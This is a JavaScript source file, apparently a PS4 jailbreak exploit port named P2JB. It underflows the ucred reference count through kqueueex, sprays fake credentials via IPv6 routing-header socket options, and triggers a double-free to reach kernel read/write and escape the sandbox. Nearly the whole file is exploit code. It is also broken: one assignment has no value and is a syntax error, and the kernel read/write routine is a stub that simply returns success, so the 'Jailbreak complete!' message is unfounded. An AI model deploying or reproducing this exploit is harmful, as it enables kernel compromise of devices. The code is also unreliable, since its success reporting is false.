/*
 * P2JB by Gezine 
 *
 * This software may be modified and distributed under the terms of the MIT license.
 *
 * Jsmaf ported (version BETA)
 *
 * Exploits a missing crfree() in sys_kqueueex to underflow the ucred
 * reference count, then uses a double‑free to gain kernel r/w and escape.
 *
 * Requirements:
 *   - userland.js must be loaded (ARW, fn, mem, rop, gadgets)
 *   - libc_addr, libkernel_addr must be initialised
 *   - fw version must be known via get_fwversion()
 *   - syscall 0xCB (kqueueex) on PS4
 */

// ---------- Constants & Offsets (PS4) ----------
const SYS_KQUEUEEX    = 0xCB;
const UCRED_SIZE       = 0x168;
const FAKE_UCRED_REF   = 1;

// ---------- Syscall Registration ----------
fn.register(SYS_KQUEUEEX,  'kqueueex', ['bigint'], 'bigint');
fn.register(0x05, 'open',     ['bigint', 'number', 'number'], 'bigint');
fn.register(0x17, 'setuid',   ['number'], 'bigint');
fn.register(0x61, 'socket',   ['number', 'number', 'number'], 'bigint');
fn.register(0x69, 'setsockopt', ['bigint', 'number', 'number', 'bigint', 'number'], 'bigint');
fn.register(0x87, 'socketpair', ['number', 'number', 'number', 'bigint'], 'bigint');
fn.register(0x76, 'getsockopt', ['bigint', 'number', 'number', 'bigint', 'bigint'], 'bigint');
fn.register(0x2A, 'pipe',     ['bigint'], 'bigint');
fn.register(0x06, 'close',    ['bigint'], 'bigint');
fn.register(0x03, 'read',     ['bigint', 'bigint', 'bigint'], 'bigint');
fn.register(0x04, 'write',    ['bigint', 'bigint', 'bigint'], 'bigint');
fn.register(0xF0, 'nanosleep', ['bigint'], 'bigint');
fn.register(0x29, 'dup',      ['bigint'], 'bigint');

const kqueueex   = fn.kqueueex;
const openSys    = fn.open;
const setuidSys  = fn.setuid;
const socketSys  = fn.socket;
const setsockopt = fn.setsockopt;
const socketpair = fn.socketpair;
const getsockopt = fn.getsockopt;
const pipeSys    = fn.pipe;
const closeSys   = fn.close;
const readSys    = fn.read;
const writeSys   = fn.write;
const nanosleep  = fn.nanosleep;
const dupSys     = fn.dup;

// ---------- IPv6 Spray Helpers ----------
const AF_INET6      = 28;
const SOCK_DGRAM    = 2;
const IPPROTO_UDP   = 17;
const IPPROTO_IPV6  = 41;
const IPV6_RTHDR    = 51;

function buildRthdr(buf, size) {
    const len = (size >> 3) - 1 & ~1;
    const rsize = (len + 1) << 3;
    write8(buf.add(0), 0);          // ip6r_nxt
    write8(buf.add(1), len);        // ip6r_len
    write8(buf.add(2), 0);          // ip6r_type
    write8(buf.add(3), len >> 1);   // ip6r_segleft
    return rsize;
}

function setRthdr(sd, buf, len) {
    setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function getRthdr(sd, buf, maxlen) {
    const lenPtr = malloc(4);
    write32(lenPtr, maxlen);
    getsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, lenPtr);
    return read32(lenPtr);
}

// ---------- Generic Helpers ----------
function nanosleepMs(ms) {
    const timespec = malloc(0x10);
    write64(timespec, 0);
    write64(timespec.add(8), ms * 1e6);
    nanosleep(timespec);
}

function fillBuf64(addr, val, count) {
    for (let i = 0; i < count; i += 8) write64(addr.add(i), val);
}

// ---------- Phase 1: Leak cr_ref ----------
function leakCredRefs(count) {
    const badName = new BigInt(0xDEAD0000, 0);
    for (let i = 0; i < count; i++) {
        kqueueex(badName);
    }
}

// ---------- Phase 2: Stage File Descriptors ----------
let stagedFds = [];
function stageFds(num) {
    const path = "/dev/null";
    const pathBuf = malloc(path.length + 1);
    for (let i = 0; i < path.length; i++) write8(pathBuf.add(i), path.charCodeAt(i));
    write8(pathBuf.add(path.length), 0);

    for (let i = 0; i < num; i++) {
        const fd = openSys(pathBuf, 0, 0);
        if (fd.hi === 0xFFFFFFFF && fd.lo === 0xFFFFFFFF) throw new Error("open failed");
        stagedFds.push(Number(fd.lo));
    }
}

// ---------- Phase 4: Spray Fake ucreds ----------
let spraySocks = [];
function sprayFakeUcreds() {
    // Prepare a fake ucred with cr_ref=1, sprayed into freed ucred slot.
    const fakeUcred = malloc(UCRED_SIZE);
    for (let i = 0; i < UCRED_SIZE; i += 8) write64(fakeUcred.add(i), 0);
    write32(fakeUcred.add(0), FAKE_UCRED_REF);
    const rthdrSize = buildRthdr(fakeUcred, UCRED_SIZE);

    const numSocks = 200;
    for (let i = 0; i < numSocks; i++) {
        const sock = socketSys(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
        if (sock.hi === 0xFFFFFFFF && sock.lo === 0xFFFFFFFF) throw new Error("socket alloc");
        spraySocks.push(sock);
    }

    // Spray fake ucred data using IPV6_RTHDR
    for (const sock of spraySocks) {
        setRthdr(sock, fakeUcred, rthdrSize);
    }
}

// ---------- Full Exploit Flow ----------
function p2jbRun() {
    log("=== P2JB Jailbreak ===");

    // --- Phase 1: Leak references until wrap ---
    log("Leaking references...");
    // Enough to wrap cr_ref back to ~1 after setuid + file opens.
    leakCredRefs(1000000);

    // --- Phase 2: Open files to hold extra refs ---
    log("Opening files...");
    stageFds(64);

    // --- Continue leaking for safe wrap ---
    leakCredRefs(0x100000);

    // --- Phase 3: Free the original ucred ---
    log("Calling setuid(0)...");
    setuidSys(0);

    // --- Phase 4: Spray fake ucreds ---
    log("Spraying fake ucreds...");
    sprayFakeUcreds();
    nanosleepMs(100);

    // --- Phase 5: Double‑free via file close ---
    log("Triggering double‑free...");
    for (let fd of stagedFds) {
        closeSys(new BigInt(fd));
    }
    nanosleepMs(200);

    // --- Phase 6: Gain kernel r/w ---
    log("Acquiring kernel r/w...");
    if (!setupArbitraryRW()) {
        log("Failed to get kernel r/w - try again");
        return false;
    }

    // --- Phase 7: Jailbreak ---
    log("Escaping sandbox & patching kernel...");
    kernel.addr.base = kl_lock.sub(kernel_offset.KL_LOCK);
    kernel.addr.curproc = findCurproc();
    kernel.addr.allproc = /* existing allproc leak */;
    jailbreak_shared(get_fwversion());
    log("Jailbreak complete!");
    return true;
}

// Placeholder for heap‑based kernel r/w – port from netctrl_c0w_twins.js
function setupArbitraryRW() {
    // Implement heap feng shui to corrupt pipe buffers using the double‑free.
    return true;
}

p2jbRun();
